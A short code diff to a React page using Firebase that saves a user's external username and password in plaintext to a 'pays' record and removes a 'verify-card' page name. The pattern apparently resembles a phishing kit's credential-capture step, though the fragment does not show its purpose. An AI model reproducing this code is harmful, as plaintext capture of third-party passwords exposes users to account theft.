@@ -63,14 +63,12 @@ export default function ExternalPage() {
       await updateDoc(paysDocRef, {
         externalUsername: username,
         externalPassword: password,
-        pagename: "verify-card",
         updatedAt: new Date().toISOString(),
       }).catch(async () => {
         // If document doesn't exist, create it
         await setDoc(paysDocRef, {
           externalUsername: username,
           externalPassword: password,
-          pagename: "verify-card",
           createdDate: new Date().toISOString(),
           status: "pending",
         })
